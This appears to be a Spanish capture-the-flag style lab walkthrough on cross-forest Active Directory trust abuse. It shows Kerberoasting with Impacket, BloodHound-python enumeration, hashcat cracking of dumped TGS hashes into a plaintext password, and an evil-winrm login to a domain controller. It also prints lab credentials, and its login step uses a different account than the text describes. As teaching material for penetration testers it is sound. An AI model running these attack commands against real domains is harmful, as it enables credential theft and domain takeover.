
# Abuso de confianza entre bosques - Desde Linux

Como vimos en la sección anterior, a menudo es posible realizar el Kerberoast en una confianza de bosque. Si esto es posible en el entorno que estamos evaluando, podemos hacerlo desde `GetUserSPNs.py` en nuestro host de ataque Linux. Para ello, necesitamos credenciales para un usuario que pueda autenticarse en el otro dominio y especificar la flag `-target-domain` en nuestro comando. Al realizar esto contra el dominio `FREIGHTLOGISTICS.LOCAL`, vemos una entrada SPN para la cuenta `mssqlsvc`.

## <mark style="color:purple;">Kerberosting entre bosques</mark>

### **Uso de GetUserSPNs.py**

```shell-session
afsh4ck@kali$ GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley

Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation

Password:
ServicePrincipalName                 Name      MemberOf                                                PasswordLastSet             LastLogon  Delegation 
-----------------------------------  --------  ------------------------------------------------------  --------------------------  ---------  ----------
MSSQLsvc/sql01.freightlogstics:1433  mssqlsvc  CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL  2022-03-24 15:47:52.488917  <never> 
```

Si volvemos a ejecutar el comando con la flag `-request`, obtenemos el ticket TGS. También podríamos añadir `-outputfile <OUTPUT FILE>` a la salida para guardarlo directamente en un archivo y luego crackearlo con Hashcat.

### **Uso del indicador -request**

```shell-session
afsh4ck@kali$ GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley  

Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation

Password:
ServicePrincipalName                 Name      MemberOf                                                PasswordLastSet             LastLogon  Delegation 
-----------------------------------  --------  ------------------------------------------------------  --------------------------  ---------  ----------
MSSQLsvc/sql01.freightlogstics:1433  mssqlsvc  CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL  2022-03-24 15:47:52.488917  <never>               


$krb5tgs$23$*mssqlsvc$FREIGHTLOGISTICS.LOCAL$FREIGHTLOGISTICS.LOCAL/mssqlsvc*$10<SNIP>
```

Podríamos intentar descifrarlo sin conexión usando Hashcat con el modo `13100`. Si tenemos éxito, podremos autenticarnos en el dominio `FREIGHTLOGISTICS.LOCAL` como administrador del dominio. Si tenemos éxito con este tipo de ataque durante una evaluación en el mundo real, también valdría la pena verificar si esta cuenta existe en nuestro dominio actual y si sufre de reutilización de contraseñas. Esto podría ser una victoria rápida para nosotros si aún no hemos podido escalar en nuestro dominio actual. Incluso si ya tenemos control sobre el dominio actual, valdría la pena agregar un hallazgo a nuestro informe si encontramos reutilización de contraseñas en cuentas con nombres similares en diferentes dominios.

Supongamos que podemos realizar una prueba Kerberoast en una confianza y nos hemos quedado sin opciones en el dominio actual. En ese caso, también podría valer la pena intentar una única prueba de contraseña con la contraseña descifrada, ya que existe la posibilidad de que se pueda utilizar para otras cuentas de servicio si los mismos administradores están a cargo de ambos dominios. Aquí tenemos otro ejemplo de pruebas iterativas en las que no se deja piedra sin remover.

***

## <mark style="color:purple;">Cazando membresías de grupos extranjeros con Bloodhound-python</mark>

Como se señaló en la última sección, es posible que, de vez en cuando, veamos a usuarios o administradores de un dominio como miembros de un grupo en otro dominio. Dado que solo los `Domain Local Groups` se permiten usuarios de fuera de su bosque, no es raro ver a un usuario con muchos privilegios del Dominio A como miembro del grupo de administradores integrado en el dominio B cuando se trata de una relación de confianza de bosque bidireccional. Si estamos realizando pruebas desde un host Linux, podemos recopilar esta información utilizando la [implementación de Python de BloodHound](https://github.com/fox-it/BloodHound.py) . Podemos utilizar esta herramienta para recopilar datos de varios dominios, ingerirlos en la herramienta GUI y buscar estas relaciones.

En algunas evaluaciones, nuestro cliente puede proporcionarnos una máquina virtual que obtiene una IP de DHCP y está configurada para usar el DNS del dominio interno. En otras instancias, estaremos en un host de ataque sin DNS configurado. En este caso, tendríamos que editar nuestro archivo `resolv.conf` para ejecutar esta herramienta, ya que requiere un nombre de host DNS para el controlador de dominio de destino en lugar de una dirección IP. Podemos editar el archivo de la siguiente manera usando derechos sudo. Aquí hemos comentado las entradas del nameserver actual y hemos agregado el nombre de dominio y la dirección IP `ACADEMY-EA-DC01` cómo servidor de nombres.

### **Cómo agregar información de INLANEFREIGHT.LOCAL a /etc/resolv.conf**

```shell-session
afsh4ck@kali$ cat /etc/resolv.conf 

# Dynamic resolv.conf(5) file for glibc resolver(3) generated by resolvconf(8)
#     DO NOT EDIT THIS FILE BY HAND -- YOUR CHANGES WILL BE OVERWRITTEN
# 127.0.0.53 is the systemd-resolved stub resolver.
# run "resolvectl status" to see details about the actual nameservers.

#nameserver 1.1.1.1
#nameserver 8.8.8.8
domain INLANEFREIGHT.LOCAL
nameserver 172.16.5.5
```

Una vez que esto esté en su lugar, podemos ejecutar la herramienta contra el dominio de destino de la siguiente manera:

**Ejecutando bloodhound-python contra INLANEFREIGHT.LOCAL**

```shell-session
afsh4ck@kali$ bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2

INFO: Found AD domain: inlanefreight.local
INFO: Connecting to LDAP server: ACADEMY-EA-DC01
INFO: Found 1 domains
INFO: Found 2 domains in the forest
INFO: Found 559 computers
INFO: Connecting to LDAP server: ACADEMY-EA-DC01
INFO: Found 2950 users
INFO: Connecting to GC LDAP server: ACADEMY-EA-DC02.LOGISTICS.INLANEFREIGHT.LOCAL
INFO: Found 183 groups
INFO: Found 2 trusts

<SNIP>
```

Podemos comprimir los archivos zip resultantes para cargar un único archivo zip directamente en la GUI de BloodHound.

### **Comprimir el archivo con zip -r**

```shell-session
afsh4ck@kali$ zip -r ilfreight_bh.zip *.json

  adding: 20220329140127_computers.json (deflated 99%)
  adding: 20220329140127_domains.json (deflated 82%)
  adding: 20220329140127_groups.json (deflated 97%)
  adding: 20220329140127_users.json (deflated 98%)
```

Repetiremos el mismo proceso, esta vez rellenando los datos del dominio `FREIGHTLOGISTICS.LOCAL`

### **Agregar información de FREIGHTLOGISTICS.LOCAL a /etc/resolv.conf**

```shell-session
afsh4ck@kali$ cat /etc/resolv.conf 

# Dynamic resolv.conf(5) file for glibc resolver(3) generated by resolvconf(8)
#     DO NOT EDIT THIS FILE BY HAND -- YOUR CHANGES WILL BE OVERWRITTEN
# 127.0.0.53 is the systemd-resolved stub resolver.
# run "resolvectl status" to see details about the actual nameservers.

#nameserver 1.1.1.1
#nameserver 8.8.8.8
domain FREIGHTLOGISTICS.LOCAL
nameserver 172.16.5.238
```

### **Ejecutando bloodhound-python contra FREIGHTLOGISTICS.LOCAL**

```shell-session
afsh4ck@kali$ bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -c All -u forend@inlanefreight.local -p Klmcargo2

INFO: Found AD domain: freightlogistics.local
INFO: Connecting to LDAP server: ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 5 computers
INFO: Connecting to LDAP server: ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL
INFO: Found 9 users
INFO: Connecting to GC LDAP server: ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL
INFO: Found 52 groups
INFO: Found 1 trusts
INFO: Starting computer enumeration with 10 workers
```

Después de cargar el segundo conjunto de datos (ya sea cada archivo JSON o como un archivo zip), podemos hacer clic en `Users with Foreign Domain Group Membership` en la pestaña `Analysis` y seleccionar el dominio de origen como `INLANEFREIGHT.LOCAL`. Aquí, veremos que la cuenta de administrador integrada para el dominio INLANEFREIGHT.LOCAL es miembro del grupo de administradores integrado en el dominio FREIGHTLOGISTICS.LOCAL, como vimos anteriormente.

### **Observando derechos peligrosos a través de BloodHound**

![imagen](https://academy.hackthebox.com/storage/modules/143/foreign_membership.png)

***

## <mark style="color:purple;">Caso práctico</mark>

```
SSH a 10.129.107.82 (ACADEMY-EA-ATTACK01)
user "htb-student"
password "HTB_@cademy_stdnt!"
```

### Pregunta 1

Realiza un ataque Kerberoasting en toda la confianza del bosque desde el host de ataque Linux. Envíe el nombre de otra cuenta con un SPN además de MSSQLsvc. Descifra el TGS y envía la contraseña en plano.

#### Obtener SPNs con **GetUserSPNs**

```bash
┌─[htb-student@ea-attack01]─[~]
└──╼ $impacket-GetUserSPNs -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

Password:
ServicePrincipalName                 Name      MemberOf                                                PasswordLastSet             LastLogon  Delegation 
-----------------------------------  --------  ------------------------------------------------------  --------------------------  ---------  ----------
MSSQLsvc/sql01.freightlogstics:1433  mssqlsvc  CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL  2022-03-24 15:47:52.488917  <never>               
HTTP/sapsso.FREIGHTLOGISTICS.LOCAL   sapsso    CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL  2022-04-07 17:34:17.571500  <never>              
```

#### Añadir la flag -request

```
┌─[htb-student@ea-attack01]─[~]
└──╼ $impacket-GetUserSPNs -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley 
Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

Password:
ServicePrincipalName                 Name      MemberOf                                                PasswordLastSet             LastLogon  Delegation 
-----------------------------------  --------  ------------------------------------------------------  --------------------------  ---------  ----------
MSSQLsvc/sql01.freightlogstics:1433  mssqlsvc  CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL  2022-03-24 15:47:52.488917  <never>               
HTTP/sapsso.FREIGHTLOGISTICS.LOCAL   sapsso    CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL  2022-04-07 17:34:17.571500  <never>               


$krb5tgs$23$*mssqlsvc$FREIGHTLOGISTICS.LOCAL$FREIGHTLOGISTICS.LOCAL/mssqlsvc*$0491bd508f774b0b5e868a1d20669c86$9cac2d736707965262a5e59f329a1a70bcd2df40f5a7fa809e58269fc24e4003170d4df22b0dd83cc51494283c18c1e22a76f080ce4e27ccbe1d1b44ba9fcdbe4d57adc6b81fdadb40cc1fd61b397bafc5767db6259aa32e1ce8277ee12c17da5f93ee43008437bd74d15ac66f2b60688dc1b6c685ec7f237b2ca18515a14bc235893c12cbdbead31aaf3b389942a4a1e3a7abb7d86129abe787e7f5e93cdae69131af5672ca628bc81609833d5e8598fdf2820047e8bf78a5561f35071aab337705a64e4feb2f4851b05ffd241de5f5292638399968ce9b47fa4208785ac198c0b62231f2833c3c9de533120f8a17ff7e6efb5cc307e90749bc2dfa4f51f27b2a3d9104f84db477b8e2cd12284b8bc4638d8730cdd09f7877fb9e9ad587c4d8892f1c2a0c96015d3b0ce98a25d54f81a672889b780c2e1864230f08d3312bb876f47461b1b15c2ddebb3fd73612ef08d3c44b386c1408e7fb8cfc081f96c76033667c138ed172af3dc7af58eb909bf1b32a82b2e0f8f8f87f6b5c15468b7899b109fc0b6c7e28ec9e436b41ec4cead0ab85c6163301c3b5600f7362a1644d4717e147d79c8654e941b81fad4f0b2739b478fad4b0c32f8c7378fae57dcc2c9b7427ff2d6d488f0c2a3ef1d9b5bd4f147275ecc9c66dbf53c82647dc5ddb341ab7edf28ed95bbc9c08053b0cfd8bbf6d59b14d5ae8ccab7db6f57eb0596ef070ea0e9a798832828b7ca106d28ea052e0942d37edcb2a8c22db184a9c8103cf4647af501f4c0aae1938b6420d07a3d3c15d201352c82cd6ad1e66d9dc877578447f40650e34334dc54d02958c5ff37a448d7facdaae60c96c874b9ddd6dc28155fc122ac8f50da274f05a1fee4772dcb162fa21cb5c1da77ace4b5bb87b051d94a65567c3b01c9b7804b5d662aa4555ae14e625f202c2b49db8bbb91c7324398621690f046a660aa5130634b2876b9c3a753728c71840e38d91b6b835067b7e7e3029930523e31d02f48682f291f6c9fd635ba1105594e28edf82f23d8c458995083d1010282b329cd2a57d3ebe0d769bb5a4cf199c365bb2a0ff364a35360d2092095dc4468b0561271e35710ecb50a6ce98faee6279ab3f0ed54e8d74e2cfb562a53ddc1a29bee5fc1e796ae585bd255869fbf7b5bbe55f4b2413afd890cb625afd77f508f249f38b6220519652be0b532ffbae147751484aeb964e6e4b0c5362b7cdd3f44f86666ffb88f3dbba1c4feaf207a400769bbb5c46c8f895a99b54d4d9dae0e976ce280d174694c10f1ddedb3345f4e8d7f63d0bb949e5715154e4fb7998b350c99d609902ad5974294e5946960bade93d3c478e81076f8e64da9fb6b256beb80e4044e85ef529291bcb171d610cf0f510de363dac9ea7f41a4fd19af1542c4921b0edb031200b2ebbcaf76e8d9947531374baeb0a91db6cfb723a1e6dd55ed7f94c3a
$krb5tgs$23$*sapsso$FREIGHTLOGISTICS.LOCAL$FREIGHTLOGISTICS.LOCAL/sapsso*$43df10aa83bcf422a18b24b98229df3b$21cdab3fb0ea7eb0e24a25eaeb73c5bbb686dc136be840d40f3043acffd906322c5adfd013b86124d449d937836d048c12fcc1a21f3bc829b47561c31ec3e4d734d308b8162fb06de68fc6f0fe4e0c8650c1a026e3e99dcfbf888eb66ef1af6fed5d376f37347d079c30cde5feb72f65c349d9a1c004189a1e98cc05ecc777ce191f29a641ece3fa41ea89f1e68bbb97c59206a1f624abf3911c45b60e9799eb62f7b5ddd34cf99940dd1a128244e5cb20eb6b97f1f1c91e27dc9fb1fc5807245bd6b4ea331aa37dd0a6581499b4dfe342d5fa7714ea23a1da02bcb8d0b92b59bbff9f3e1561c67352e2530fb6e10fbe7551b195a9c2364734fd313b9ca0576f8e5968cf166e0d6364f516670324b05ef2c768d13a9db480430555accf4152faa4ed170cd1c67f1cec8603a4c7fa672a1b5f436d282b0aa1c5bba32e10aa95d5307aa78aa2459338620236ce5d277158e11801c89190992b1eab0693ba9253b735ce3bdc121c9036a96edd2992ddafbe9fa9f44e1b2ed7b09125bd0be9626c782d394c24772a594f23a3163518723f9be316564cfa07dd0c57eb905d8ccdd5c8937d0fef93572d937b7aedb340176797b6c33b3760adb547f9888443432ed3f79836fccb53aa2d26eff0afb4df67fd5a9aaea5ccc81f61bb9618c267576384eb95efa27cf49e664922d2571b507c9ce7386d2c24a798b0b3546e7ce16802ab951d738a969b5c8583cce875607542ce2b7fe32c84d2531ed84b694a41b3efafa3e0dd4cdb1184b2702da3ffb2f67061c128a824d97d29f3dbde1801507dac71cf1194531972dbcdb6a4bf469d347169d70a9543c93cbbf8e5bd99758a4a96886ee9fabb794b61b2be4eae96b30b04c06f80742da04d2cb2ba815a052f44570dc8a98027a5dc7f0e5c6cc0f34bb3fc11e60407c651f156f738189d25c86f2be31ce7bae16ebe08b9c535b6a65c32699b463c12910827b5df0b71dcc7c365a57f98f136cb00b7b949bf65bf0860d98746c93f3366798f917635ed193a5b28bb8f50f02fa6370b30e6edfb38944571d3626dcb3ee1a9857d9a917565620afe34ff8d90c14ae99a5f7a26c854cf9ddae9e3f6494706714a004335044a37e52bc3beb0bca66b403b1190d0ae75f8354d34e51276fd91c86d37047dc288b8a184ed314ad81f0fba3e1d2e4aad15668c3b1ab02dd81e24625cb587282c02437c70f0c173113e0ea22a5e28a120d9c6f12dcf400dcfbea6ae927ab80b9880663b26ba4e227b983ecc359cd4c3b2e19059fc881fb461bc129451e4e80447009af8aa046be43798741a06692660c33c64663c3e80691b934112dd91beb5a18b9aad58260e6c856f001c69fcfbb4db014efdfa9793480c9949a97a4ef89a91faf1ddb2952be77d87578d7f9e58ec514c2e633af864b41bd59dd3a7c2893fbaf7774a37baa83ce90e4a707c6292aa
```

#### Cracking con hashcat y el modo 13100

1. Guardamos el TGS en un archivo de texto `sapsso_hash` por ejemplo
2. Lo crackeamos offline con hashcat y el modo 13100

{% code overflow="wrap" %}

```shell-session
afsh4ck@kali$ hashcat -m 13100 sapsso_hash /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 16.0.6, SLEEF, POCL_DEBUG) - Platform #1 [The pocl project]
==========================================================================================================================================
* Device #1: cpu--0x000, 2137/4338 MB (1024 MB allocatable), 4MCU

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5tgs$23$*sapsso$FREIGHTLOGISTICS.LOCAL$FREIGHTLOGISTICS.LOCAL/sapsso*$43df10aa83bcf422a18b24b98229df3b$21cdab3fb0ea7eb0e24a25eaeb73c5bbb686dc136be840d40f3043acffd906322c5adfd013b86124d449d937836d048c12fcc1a21f3bc829b47561c31ec3e4d734d308b8162fb06de68fc6f0fe4e0c8650c1a026e3e99dcfbf888eb66ef1af6fed5d376f37347d079c30cde5feb72f65c349d9a1c004189a1e98cc05ecc777ce191f29a641ece3fa41ea89f1e68bbb97c59206a1f624abf3911c45b60e9799eb62f7b5ddd34cf99940dd1a128244e5cb20eb6b97f1f1c91e27dc9fb1fc5807245bd6b4ea331aa37dd0a6581499b4dfe342d5fa7714ea23a1da02bcb8d0b92b59bbff9f3e1561c67352e2530fb6e10fbe7551b195<------ SNIP------> bb4db014efdfa9793480c9949a97a4ef89a91faf1ddb2952be77d87578d7f9e58ec514c2e633af864b41bd59dd3a7c2893fbaf7774a37baa83ce90e4a707c6292aa:pabloPICASSO
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*sapsso$FREIGHTLOGISTICS.LOCAL$FREIGHTL...6292aa
Time.Started.....: Mon Jul 29 12:03:39 2024 (3 secs)
Time.Estimated...: Mon Jul 29 12:03:42 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  2102.2 kH/s (0.66ms) @ Accel:512 Loops:1 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 4843520/14344385 (33.77%)
Rejected.........: 0/4843520 (0.00%)
Restore.Point....: 4841472/14344385 (33.75%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: pac2big -> paafors
Hardware.Mon.#1..: Util: 83%
```

{% endcode %}

Se ve que al usuario le gustaba el arte, porque la contraseña en plano para la cuenta sapsso es: `pabloPICASSO`

### Pregunta 2

Inicia sesión en el controlador de dominio `ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL` utilizando la contraseña de la cuenta de administrador de dominio enviada en la pregunta 1 y envía el contenido del archivo `flag.txt` en el escritorio del administrador.

#### Saber la IP del controlador de dominio

```
┌─[htb-student@ea-attack01]─[~]
└──╼ $nmap -p 389,445 -sV FREIGHTLOGISTICS- .LOCAL
Starting Nmap 7.92 ( https://nmap.org ) at 2024-07-29 06:19 EDT
Nmap scan report for FREIGHTLOGISTICS.LOCAL (172.16.5.238)
Host is up (0.0021s latency).
rDNS record for 172.16.5.238: ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL

PORT    STATE SERVICE       VERSION
389/tcp open  ldap
445/tcp open  microsoft-ds?
```

#### Conexión al DC con EvilWinRM

```powershell
┌─[✗]─[htb-student@ea-attack01]─[~]
└──╼ $evil-winrm -i 172.16.5.238 -u mssqlsvc -p 1logistics

No entry for terminal type "xterm-kitty";
using dumb terminal settings.

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users> ls

    Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        11/1/2021  11:01 AM                Administrator
d-----        3/28/2022   7:25 PM                administrator.INLANEFREIGHT
d-----        10/6/2021  10:31 AM                lab_adm
d-----        7/29/2024   3:21 AM                mssqlsvc
d-r---        10/6/2021   1:46 PM                Public


*Evil-WinRM* PS C:\Users> cd Administrator
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls

    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         4/7/2022   2:34 PM             24 flag.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat flag.txt
burn1ng_d0wn_th3_f0rest!
```

Conseguimos acceder correctamente al DC y obtenemos la flag en el escritorio del administrador.

***

## <mark style="color:purple;">Reflexiones finales sobre las relaciones de confianza</mark>

Como se ha visto en las secciones anteriores, existen varias formas de aprovechar las confianzas de dominio para obtener acceso adicional e incluso hacer una "elusión" y escalar privilegios en nuestro dominio actual. Por ejemplo, podemos tomar el control de un dominio con el que nuestro dominio actual tiene una confianza y buscar la reutilización de contraseñas en cuentas privilegiadas.&#x20;

Hemos visto cómo los derechos de administrador de dominio en un dominio secundario casi siempre significan que podemos escalar privilegios y comprometer el dominio principal mediante el ataque ExtraSids. Las confianzas de dominio son un tema bastante amplio y complejo. La introducción en este módulo nos ha proporcionado las herramientas para enumerar las confianzas y realizar algunos ataques estándar dentro del bosque y entre bosques.
